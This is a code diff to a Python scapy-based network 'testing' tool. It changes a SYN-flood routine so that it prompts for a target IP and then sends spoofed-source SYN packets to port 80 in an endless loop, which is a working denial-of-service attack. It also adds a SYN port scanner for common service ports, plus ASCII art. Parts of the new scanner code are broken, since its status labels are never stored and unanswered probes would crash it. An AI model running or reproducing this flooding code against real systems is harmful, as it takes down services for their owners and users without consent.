@@ -312,7 +312,7 @@ def webservertests():
 		(output, err) = p.communicate()
 		newoutput = str(output, 'UTF-8')
 
-		#prints output of nmap
+		#prints output of netcat
 		print ("{}".format(newoutput))
 		sleep(0.5)
 	elif (inputoption == "3"):
@@ -353,7 +353,7 @@ def basicostests():
 def basicnettests():
 	sleep(0.5)
 	#get Ip
-	IPadders = input("[*] Enter IP: ")
+	IPadders = input("[*] Enter IP of Target: ")
 	#choses
 	sleep(0.5)
 	print("[*] Which would you like to check for:")
@@ -427,13 +427,14 @@ def basicnettests():
 		
 	if (inputchoice == "2"):
 		sleep(0.5)
+		target_ip = input("What is your target ip: ")
 		print("[*] Starting SYN Flooding..")
 		sleep(2)
 		target_port = 80
 		src_IP =  RandIP()
 
 		#writing layeers
-		ip = scapy.IP(src = src_IP, dst = IPadders)
+		ip = scapy.IP(src = src_IP, dst = target_ip)
 		tcp = scapy.TCP(src_port = RandShort(), dst_port = target_port, flags = "S")
 		raw = Raw(b"X"*1024)
 
@@ -443,8 +444,43 @@ def basicnettests():
 		#loop of sending the packet
 		send(p, loop=1, verbose=0)
 		homescreen()
-			
 
+def networkscanner():
+	sleep(0.5)	
+	#asks for IP
+	IPadders = input("[*] Enter IP of router: ")
+	dst_ip = IPadders	
+	dst_ports = [20, 21, 22, 25, 53, 80, 123, 174, 443, 500, 3389]
+	dst_ports_status = [False, False, False, False, False, False, False, False, False, False, False]
+	src_port = 80
+	for port in dst_ports:
+		tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=port,flags="S"),timeout=10)
+		if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
+			if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
+				send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=port,flags="AR"),timeout=10)
+				dst_ports_status[dst_ports.index(port)] = True
+			elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
+				dst_ports_status[dst_ports.index(port)] = False
+	for status in dst_ports_status:
+		if(status == True):
+			status = "Open"
+		if(status == False):
+			status = "Closed"
+	print("""
+	Scanning %s
+	PORT:	STATUS:   SERVICE:
+	%s      %s	FTP
+	%s      %s        FTP
+	%s      %s        SSH
+	%s      %s        SMTP
+	%s      %s        DNS
+	%s      %s        HTTP
+	%s      %s        NTP
+	%s      %s        BGP
+	%s      %s        HTTPS
+	%s      %s        ISAKMP
+	%s      %s        RDP
+	"""%(IPadders, dst_ports[0], dst_ports_status[0], dst_ports[1], dst_ports_status[1], dst_ports[2], dst_ports_status[2], dst_ports[3], dst_ports_status[3], dst_ports[4], dst_ports_status[4], dst_ports[5], dst_ports_status[5], dst_ports[6], dst_ports_status[6], dst_ports[7], dst_ports_status[7], dst_ports[8], dst_ports_status[8], dst_ports[9], dst_ports_status[9], dst_ports[10], dst_ports_status[10]))
 def basicwebtests():
 	#sending packets
 	#asks for IP 
@@ -483,6 +519,27 @@ print("|  \| |/ _ \ __\___ \ / __/ _` | '_ \ ")
 print("| |\  |  __/ |_ ___) | (_| (_| | | | | ")
 print("|_| \_|\___|\__|____/ \___\__,_|_| |_| ")
 
+print('')
+print('                    _                   _')
+print('                  /_ /|               /_ /|')
+print('                 |  | |              |  | |')
+print('                 |  | |              |  | |')
+print('                 |  | |              |  | |')
+print('                 |  | |              |  | |')
+print('                 |  | |              |  | |')
+print('                 |  | |              |  | |')
+print('                 |  | |              |  | |')
+print('                +|  |,"--------------|  |+"')
+print('              ,"                        ,"|')
+print('            ,"                        ,"  |')
+print('          ,"                        ,"    |')
+print('        ,"                        ,"      |')
+print('        +-------------------------+       |')
+print('        |                         |      ,"')
+print('        |                         |    ,"')
+print('        |                         |  ,"')
+print('        |                         |,"')
+print("        +-------------------------+")
 
 print("")
 
@@ -493,7 +550,8 @@ def homescreen():
 	print("2-> osrelatedtests")
 	print("3-> networktests")
 	print("4-> run a nmap scan")
-	testtype = input("[*] Tests 1 or 2 or 3 or 4: ")
+	print("5-> run a network scan")
+	testtype = input("[*] Tests 1 or 2 or 3 or 4 or 5: ")
 	if (testtype == "1"):
 		basicwebtests()
 	elif (testtype == "2"):
@@ -502,6 +560,8 @@ def homescreen():
 		basicnettests()
 	elif (testtype == "4"):
 		nmapscan()
+	elif (testtype == "5"):
+		networkscanner()
 	else:
 		print("[*] Please Enter 1,2,3, or 4: ")
 		homescreen()
